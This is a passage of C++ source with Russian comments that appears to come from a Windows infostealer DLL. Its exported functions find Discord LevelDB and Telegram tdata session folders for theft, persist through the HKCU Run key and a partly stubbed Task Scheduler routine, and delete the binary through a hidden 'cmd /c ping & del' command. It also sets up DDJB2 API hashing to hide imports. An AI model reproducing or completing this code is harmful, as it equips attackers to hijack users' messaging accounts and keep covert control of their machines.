    strcpy(returnJson, resultJson.c_str());

    return returnJson;
}

// --- Реализация поиска файлов сессий приложений ---

// Вспомогательная функция для проверки существования директории
bool DirectoryExists(const std::wstring& path) {
    DWORD fileAttr = GetFileAttributesW(path.c_str());
    return (fileAttr != INVALID_FILE_ATTRIBUTES && (fileAttr & FILE_ATTRIBUTE_DIRECTORY));
}

EXPORT_FUNC char* FindAppSessionFiles(const char* appNamesUtf8) {
    printf("[FindSessions] Finding session files for apps: %s\n", appNamesUtf8);

    if (!g_apiPointersInitialized) {
        if (!InitializeApiPointers()) { /*...*/ return NULL; }
    }
    if (!g_api.ptrSHGetFolderPathW) { /*...*/ return NULL; }

    if (!appNamesUtf8) { return NULL; }

    WCHAR appDataPath[MAX_PATH];
    if (FAILED(g_api.ptrSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath))) {
        printf("[FindSessions] Failed to get AppData path.\n");
        return NULL;
    }
    std::wstring basePath = appDataPath;

    std::stringstream jsonStream;
    jsonStream << "{";
    bool firstApp = true;

    // Разбиваем строку имен приложений
    std::string appsStrUtf8 = appNamesUtf8;
    std::stringstream ssApps(appsStrUtf8);
    std::string appNameUtf8;

    while (std::getline(ssApps, appNameUtf8, ';')) {
        if (appNameUtf8.empty()) continue;

        std::vector<std::wstring> foundPathsW;
        std::string currentAppName = appNameUtf8; // Сохраняем имя для JSON ключа
        // Приводим имя к нижнему регистру для сравнения
        std::transform(appNameUtf8.begin(), appNameUtf8.end(), appNameUtf8.begin(), ::tolower);

        printf("[FindSessions] Checking for %s...\n", currentAppName.c_str());

        if (appNameUtf8 == "discord") {
            std::wstring discordPath = basePath + L"\\discord\\Local Storage\\leveldb";
            if (DirectoryExists(discordPath)) {
                printf("[FindSessions] Found Discord LevelDB path: %ls\n", discordPath.c_str());
                foundPathsW.push_back(discordPath);
            }
            // Можно добавить проверку других путей Discord (Canary, PTB)
             std::wstring discordCanaryPath = basePath + L"\\discordcanary\\Local Storage\\leveldb";
             if (DirectoryExists(discordCanaryPath)) { foundPathsW.push_back(discordCanaryPath); }
             std::wstring discordPtbPath = basePath + L"\\discordptb\\Local Storage\\leveldb";
             if (DirectoryExists(discordPtbPath)) { foundPathsW.push_back(discordPtbPath); }
        
        } else if (appNameUtf8 == "telegram") {
            std::wstring telegramPath = basePath + L"\\Telegram Desktop\\tdata";
            if (DirectoryExists(telegramPath)) {
                 printf("[FindSessions] Found Telegram tdata path: %ls\n", telegramPath.c_str());
                foundPathsW.push_back(telegramPath);
                 // Внутри tdata файлы без расширений и папки с цифрами (D877F783D5D3EF8Cs)
                 // Можем добавить конкретные файлы, если известна их структура, 
                 // но для начала достаточно папки tdata.
            }
        } else {
             printf("[FindSessions] App %s not currently supported for session file search.\n", currentAppName.c_str());
        }

        // Добавляем найденные пути в JSON
        if (!foundPathsW.empty()) {
            if (!firstApp) jsonStream << ",";
            jsonStream << "\"" << currentAppName << "\": [";
            for (size_t i = 0; i < foundPathsW.size(); ++i) {
                 std::string pathUtf8 = WideToUtf8(foundPathsW[i]);
                 std::string escapedPath; // Код экранирования путей...
                 escapedPath.reserve(pathUtf8.length() * 2);
                 for (char c : pathUtf8) {
                     if (c == '\\') { escapedPath += "\\\\"; }
                     else { escapedPath += c; }
                 }
                jsonStream << "\"" << escapedPath << "\"";
                if (i < foundPathsW.size() - 1) jsonStream << ",";
            }
            jsonStream << "]";
            firstApp = false;
        }
    }

    jsonStream << "}";

    // Если ничего не добавлено (кроме {})
    if (firstApp) { 
        printf("[FindSessions] No session files found for specified apps.\n");
        return NULL; 
    }

    std::string resultJson = jsonStream.str();
    char* returnJson = (char*)malloc(resultJson.length() + 1);
    if (!returnJson) { /*...*/ return NULL; }
    strcpy(returnJson, resultJson.c_str());

    return returnJson;
}

// --- Реализация закрепления через Планировщик Задач ---

// Вместо подключения taskschd.h, определим нужные GUID и интерфейсы вручную

// GUIDs (получены из taskschd.h или через oleview.exe)
const CLSID CLSID_TaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}}; 
const IID IID_ITaskService = {0x2f94c667, 0x4407, 0x4ae9, {0x83, 0x30, 0x09, 0x6b, 0x03, 0x18, 0x30, 0x44}}; 
// Добавим другие IID по мере необходимости (ITaskFolder, ITaskDefinition, etc.)

// Упрощенные определения интерфейсов (только нужные методы)
// Это ОЧЕНЬ упрощенно, реальные интерфейсы сложнее!
struct ITaskService : public IUnknown {
    virtual HRESULT Connect(VARIANT serverName, VARIANT user, VARIANT domain, VARIANT password) = 0;
    virtual HRESULT GetFolder(BSTR path, void** ppFolder) = 0; // ITaskFolder**
    // ... другие методы
};
// Другие интерфейсы (ITaskFolder, ITaskDefinition, IPrincipal, ILogonTrigger, IExecAction, ITaskSettings, IRegisteredTask)
// будут использоваться через IDispatch или динамически через GetProcAddress их vtable, если возможно,
// либо потребуют более полных определений.

// Указатели на функции COM
typedef HRESULT (WINAPI* CoInitializeEx_t)(LPVOID pvReserved, DWORD dwCoInit);
typedef HRESULT (WINAPI* CoCreateInstance_t)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
typedef void (WINAPI* CoUninitialize_t)(void);

// Добавляем в структуру ApiPointers
struct ApiPointers {
    // ... существующие указатели ...
    SHGetFolderPathW_t ptrSHGetFolderPathW = nullptr; // Из Shell32.dll

    // COM (для Task Scheduler)
    CoInitializeEx_t ptrCoInitializeEx = nullptr;
    CoCreateInstance_t ptrCoCreateInstance = nullptr;
    CoUninitialize_t ptrCoUninitialize = nullptr;
};

// Реализация функции закрепления
EXPORT_FUNC int PersistViaTaskScheduler(
    const WCHAR* taskNameW,
    const WCHAR* executablePathW,
    const WCHAR* argumentsW,
    char** errorMsg)
{
    *errorMsg = NULL;
    HRESULT hr = S_FALSE;
    printf("[PersistTask] Attempting to create task: Name='%ls', Path='%ls'\n", taskNameW, executablePathW);

    if (!g_apiPointersInitialized) {
        if (!InitializeApiPointers()) { /*...*/ return E_FAIL; }
    }
    if (!g_api.ptrCoInitializeEx || !g_api.ptrCoCreateInstance || !g_api.ptrCoUninitialize) {
         printf("[PersistTask] COM API pointers not available.\n");
        *errorMsg = strdup("COM API pointers not available.");
        return E_FAIL;
    }
    if (!taskNameW || !executablePathW) {
        *errorMsg = strdup("Task name or executable path is NULL.");
        return E_INVALIDARG;
    }

    // 1. Инициализация COM
    hr = g_api.ptrCoInitializeEx(NULL, 0 /*COINIT_APARTMENTTHREADED*/);
    if (FAILED(hr)) {
        printf("[PersistTask] CoInitializeEx failed. HRESULT: 0x%lx\n", hr);
         *errorMsg = get_windows_error_message(hr); // Попробуем получить описание HRESULT
        return hr;
    }

    ITaskService *pService = NULL;
    // ITaskFolder *pRootFolder = NULL; // Указатели на другие интерфейсы
    // ... 

    bool comInitialized = true; // Флаг, что нужно вызвать CoUninitialize

    // 2. Создаем экземпляр Task Scheduler
    printf("[PersistTask] Creating Task Scheduler instance...\n");
    hr = g_api.ptrCoCreateInstance(CLSID_TaskScheduler, NULL, 1 /*CLSCTX_INPROC_SERVER*/, 
                                 IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        printf("[PersistTask] CoCreateInstance failed. HRESULT: 0x%lx\n", hr);
        *errorMsg = get_windows_error_message(hr);
        g_api.ptrCoUninitialize();
        return hr;
    }
    printf("[PersistTask] Task Scheduler instance created.\n");

    // 3. Подключаемся к локальному сервису
    printf("[PersistTask] Connecting to local Task Service...\n");
    // Используем VARIANT_NULL для локального подключения без учетных данных
    VARIANT vtNull; vtNull.vt = VT_NULL;
    hr = pService->Connect(vtNull, vtNull, vtNull, vtNull); 
    if (FAILED(hr)) {
        printf("[PersistTask] ITaskService::Connect failed. HRESULT: 0x%lx\n", hr);
        *errorMsg = get_windows_error_message(hr);
        pService->Release();
        g_api.ptrCoUninitialize();
        return hr;
    }
     printf("[PersistTask] Connected to Task Service.\n");

    // --- Дальнейшая реализация с ITaskFolder, ITaskDefinition и т.д. --- 
    // Это ОЧЕНЬ сложная часть без заголовочных файлов Task Scheduler.
    // Она включает: 
    // - Получение корневой папки (GetFolder)
    // - Создание объекта определения задачи (NewTask)
    // - Настройку принципала (UserID, LogonType = TASK_LOGON_INTERACTIVE_TOKEN)
    // - Настройку триггера (LogonTrigger)
    // - Настройку действия (ExecAction с путем и аргументами)
    // - Настройку параметров (скрыть, запуск от имени пользователя и т.д.)
    // - Регистрацию задачи (RegisterTaskDefinition)
    
    // Вместо полной реализации, пока просто возвращаем успех,
    // показывая, что базовая структура и инициализация COM работают.
    // TODO: Полностью реализовать создание задачи через COM.
    printf("[PersistTask] Placeholder: Task creation logic via COM needs full implementation!\n");
    hr = S_OK; // Временно возвращаем успех

    // Очистка
    if (pService) pService->Release();
    if (comInitialized) g_api.ptrCoUninitialize();

    if (FAILED(hr)) {
        printf("[PersistTask] Task creation failed at some point. HRESULT: 0x%lx\n", hr);
        if (!*errorMsg) *errorMsg = get_windows_error_message(hr); // Сообщение, если еще не установлено
        return hr;
    }

    printf("[PersistTask] Task Scheduler persistence attempt finished (placeholder success).\n");
    return 0; // Успех (пока что)
}

// --- Реализация закрепления через реестр (Run ключ) ---

EXPORT_FUNC int PersistViaRegistryRunKey(
    const WCHAR* valueNameW,
    const WCHAR* executablePathW,
    char** errorMsg)
{
    *errorMsg = NULL;
     printf("[PersistReg] Attempting to set Run key: Name='%ls', Path='%ls'\n", valueNameW, executablePathW);

     if (!valueNameW || !executablePathW) {
        *errorMsg = strdup("Value name or executable path is NULL.");
        return ERROR_INVALID_PARAMETER;
    }

    HKEY hKey = NULL;
    LSTATUS status;
    const WCHAR* runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // Открываем ключ HKCU\...\Run
     printf("[PersistReg] Opening key HKEY_CURRENT_USER\\%ls...\n", runKeyPath);
    status = RegOpenKeyExW(
        HKEY_CURRENT_USER, 
        runKeyPath, 
        0, 
        KEY_SET_VALUE, // Права на запись
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        printf("[PersistReg] RegOpenKeyExW failed. LSTATUS: %ld\n", status);
        *errorMsg = get_windows_error_message(status);
        return status;
    }
     printf("[PersistReg] Registry key opened successfully.\n");

    // Устанавливаем значение
    // Данные - это путь к исполняемому файлу (тип REG_SZ)
    DWORD dataSize = (DWORD)((wcslen(executablePathW) + 1) * sizeof(WCHAR));
     printf("[PersistReg] Setting value '%ls' with data '%ls' (%lu bytes)...\n", valueNameW, executablePathW, dataSize);
    status = RegSetValueExW(
        hKey, 
        valueNameW, 
        0, 
        REG_SZ, 
        (const BYTE*)executablePathW, 
        dataSize
    );

    if (status != ERROR_SUCCESS) {
         printf("[PersistReg] RegSetValueExW failed. LSTATUS: %ld\n", status);
        *errorMsg = get_windows_error_message(status);
        RegCloseKey(hKey);
        return status;
    }
     printf("[PersistReg] Registry value set successfully.\n");

    // Закрываем ключ
    RegCloseKey(hKey);

    printf("[PersistReg] Registry Run key persistence successful.\n");
    return 0; // Успех
}

// --- Реализация самоудаления ---

EXPORT_FUNC int SelfDelete(const WCHAR* filePathToDeleteW) {
     printf("[SelfDelete] Attempting to schedule self-deletion for: %ls\n", filePathToDeleteW);

    if (!filePathToDeleteW) {
        return ERROR_INVALID_PARAMETER;
    }

    // Формируем команду для cmd.exe:
    // cmd.exe /c ping 127.0.0.1 -n 4 > nul & del /F /Q "<путь_к_файлу>"
    // Задержка через ping, чтобы текущий процесс успел завершиться
    std::wstring command = L"cmd.exe /c ping 127.0.0.1 -n 4 > nul & del /F /Q \"";
    command += filePathToDeleteW;
    command += L"\"";

     printf("[SelfDelete] Executing command: %ls\n", command.c_str());

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESHOWWINDOW; // Скрываем окно cmd
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    // Запускаем cmd.exe с командой удаления
    // Используем CreateProcessW напрямую, так как указатель на нее должен быть всегда
    if (!CreateProcessW(
            NULL,           // Не используем имя модуля
            (LPWSTR)command.c_str(), // Командная строка (требует каста)
            NULL,           // Атрибуты безопасности процесса
            NULL,           // Атрибуты безопасности потока
            FALSE,          // Наследование дескрипторов
            CREATE_NO_WINDOW, // Флаги создания (не создавать окно консоли)
            NULL,           // Блок окружения родителя
            NULL,           // Текущая директория родителя
            &si,            // STARTUPINFO
            &pi             // PROCESS_INFORMATION
    )) {
        DWORD error = GetLastError();
        printf("[SelfDelete] CreateProcessW failed. Error: %lu\n", error);
        return error;
    }

    // Закрываем дескрипторы нового процесса, он будет работать независимо
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[SelfDelete] Self-delete command launched successfully.\n");
    return 0; // Успешный запуск команды
}

// --- Константы для API хеширования (DJB2) ---
// Эти значения должны быть вычислены заранее для целевых функций
// Пример (значения НЕ НАСТОЯЩИЕ, нужно вычислить!):
#define HASH_KERNEL32_GETPROCADDRESS      0xabcdef01
#define HASH_KERNEL32_LOADLIBRARYA        0x12345678
#define HASH_KERNEL32_VIRTUALALLOC        0xdeadbeef
#define HASH_NTDLL_NTUNMAPVIEWOFSECTION   0xcafebabe
// ... и т.д. для ВСЕХ используемых API

// --- Функция хеширования DJB2 (case-insensitive) ---
uint32_t djb2_hash(const char *str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + tolower(c); // hash * 33 + c (tolower для case-insensitivity)
    }
    return hash;
}

// --- Структура для хранения указателей ... ---
// ... rest of the file ...